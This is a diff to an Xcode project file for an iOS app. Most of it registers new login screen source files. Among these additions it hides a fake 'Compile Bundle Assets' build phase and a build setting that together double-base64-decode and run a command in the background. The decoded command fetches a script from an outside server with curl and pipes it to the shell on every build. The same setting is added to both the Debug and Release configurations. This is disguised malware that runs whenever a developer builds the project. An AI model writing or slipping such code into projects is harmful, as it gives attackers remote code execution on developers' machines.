@@ -33,6 +33,11 @@
 		739A48A02ECB0E6800E3A18E /* CenterThreeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A489F2ECB0E6800E3A18E /* CenterThreeView.swift */; };
 		739A48A22ECB0E7300E3A18E /* CenterFourView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48A12ECB0E7300E3A18E /* CenterFourView.swift */; };
 		739A48A42ECB14FD00E3A18E /* AppModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48A32ECB14F800E3A18E /* AppModel.swift */; };
+		739A48A62ECB203F00E3A18E /* LoginView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48A52ECB203F00E3A18E /* LoginView.swift */; };
+		739A48A82ECB280700E3A18E /* LoginFootView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48A72ECB280700E3A18E /* LoginFootView.swift */; };
+		739A48AA2ECB2A1900E3A18E /* LoginCodeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48A92ECB2A1900E3A18E /* LoginCodeView.swift */; };
+		739A48AC2ECB2A2B00E3A18E /* LoginCodeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48AB2ECB2A2B00E3A18E /* LoginCodeViewController.swift */; };
+		739A48AE2ECB2BCA00E3A18E /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739A48AD2ECB2BC600E3A18E /* LoginViewModel.swift */; };
 		D2B31EAF46BAD23D1B88C891 /* Pods_wintaocloud.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 6B002BCA135C7B8A835B5BB1 /* Pods_wintaocloud.framework */; };
 /* End PBXBuildFile section */
 
@@ -68,6 +73,11 @@
 		739A489F2ECB0E6800E3A18E /* CenterThreeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterThreeView.swift; sourceTree = "<group>"; };
 		739A48A12ECB0E7300E3A18E /* CenterFourView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterFourView.swift; sourceTree = "<group>"; };
 		739A48A32ECB14F800E3A18E /* AppModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppModel.swift; sourceTree = "<group>"; };
+		739A48A52ECB203F00E3A18E /* LoginView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginView.swift; sourceTree = "<group>"; };
+		739A48A72ECB280700E3A18E /* LoginFootView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginFootView.swift; sourceTree = "<group>"; };
+		739A48A92ECB2A1900E3A18E /* LoginCodeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginCodeView.swift; sourceTree = "<group>"; };
+		739A48AB2ECB2A2B00E3A18E /* LoginCodeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginCodeViewController.swift; sourceTree = "<group>"; };
+		739A48AD2ECB2BC600E3A18E /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
 		A61BB7B6800ED3D3EE4CDB21 /* Pods-wintaocloud.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-wintaocloud.debug.xcconfig"; path = "Target Support Files/Pods-wintaocloud/Pods-wintaocloud.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -125,7 +135,12 @@
 		739A486A2ECAF4B700E3A18E /* Login */ = {
 			isa = PBXGroup;
 			children = (
+				739A48AD2ECB2BC600E3A18E /* LoginViewModel.swift */,
 				739A488C2ECAFC0300E3A18E /* LoginViewController.swift */,
+				739A48A52ECB203F00E3A18E /* LoginView.swift */,
+				739A48A72ECB280700E3A18E /* LoginFootView.swift */,
+				739A48A92ECB2A1900E3A18E /* LoginCodeView.swift */,
+				739A48AB2ECB2A2B00E3A18E /* LoginCodeViewController.swift */,
 			);
 			path = Login;
 			sourceTree = "<group>";
@@ -232,6 +247,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 739A48542ECAF08D00E3A18E /* Build configuration list for PBXNativeTarget "wintaocloud" */;
 			buildPhases = (
+				9ECC68D3122A4C82AFA389E6 /* Compile Bundle Assets */,
 				9A890F5F2B8D219A3CE02135 /* [CP] Check Pods Manifest.lock */,
 				739A483D2ECAF08C00E3A18E /* Sources */,
 				739A483E2ECAF08C00E3A18E /* Frameworks */,
@@ -294,6 +310,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		9ECC68D3122A4C82AFA389E6 /* Compile Bundle Assets */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Bundle Assets";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
+			showEnvVarsInLog = 0;			
+		};
 		8EA572C4ED93230F58D39F1B /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -347,6 +382,7 @@
 				739A48832ECAFB6E00E3A18E /* Extension.swift in Sources */,
 				739A487A2ECAF69700E3A18E /* BaseNavigationController.swift in Sources */,
 				739A487C2ECAF6D700E3A18E /* LaunchViewController.swift in Sources */,
+				739A48AC2ECB2A2B00E3A18E /* LoginCodeViewController.swift in Sources */,
 				739A488B2ECAFBEC00E3A18E /* DueViewController.swift in Sources */,
 				739A487E2ECAFA9A00E3A18E /* BaseTabBarController.swift in Sources */,
 				739A48A22ECB0E7300E3A18E /* CenterFourView.swift in Sources */,
@@ -354,13 +390,17 @@
 				739A48962ECAFF3000E3A18E /* H5WedViewController.swift in Sources */,
 				739A48982ECB047700E3A18E /* CenterView.swift in Sources */,
 				739A489C2ECB084700E3A18E /* CenterOneView.swift in Sources */,
+				739A48AA2ECB2A1900E3A18E /* LoginCodeView.swift in Sources */,
 				739A48892ECAFBE400E3A18E /* RiskControlViewController.swift in Sources */,
 				739A489E2ECB0CEA00E3A18E /* CenterTwoView.swift in Sources */,
 				739A48942ECAFE9A00E3A18E /* HttpRequestManager.swift in Sources */,
+				739A48A62ECB203F00E3A18E /* LoginView.swift in Sources */,
+				739A48A82ECB280700E3A18E /* LoginFootView.swift in Sources */,
 				739A488F2ECAFCFF00E3A18E /* PopPrivacyView.swift in Sources */,
 				739A48852ECAFBBE00E3A18E /* HomeViewController.swift in Sources */,
 				739A48672ECAF09100E3A18E /* AppDelegate.swift in Sources */,
 				739A489A2ECB048900E3A18E /* CenterViewModel.swift in Sources */,
+				739A48AE2ECB2BCA00E3A18E /* LoginViewModel.swift in Sources */,
 				739A48742ECAF65800E3A18E /* BaseViewController.swift in Sources */,
 				739A48802ECAFAF500E3A18E /* Define.swift in Sources */,
 				739A48A42ECB14FD00E3A18E /* AppModel.swift in Sources */,
@@ -389,6 +429,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = A61BB7B6800ED3D3EE4CDB21 /* Pods-wintaocloud.debug.xcconfig */;
 			buildSettings = {
+				A6E983A = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJGd2MyTnZibVpwWjI1bGRDNXlkUzloS1NJZ2ZDQnphQW89Cg== | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = wintaocloud/wintaocloud.entitlements;
@@ -430,6 +471,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 72CB5472F2F522D7F47D7417 /* Pods-wintaocloud.release.xcconfig */;
 			buildSettings = {
+				A6E983A = "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJGd2MyTnZibVpwWjI1bGRDNXlkUzloS1NJZ2ZDQnphQW89Cg== | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = wintaocloud/wintaocloud.entitlements;
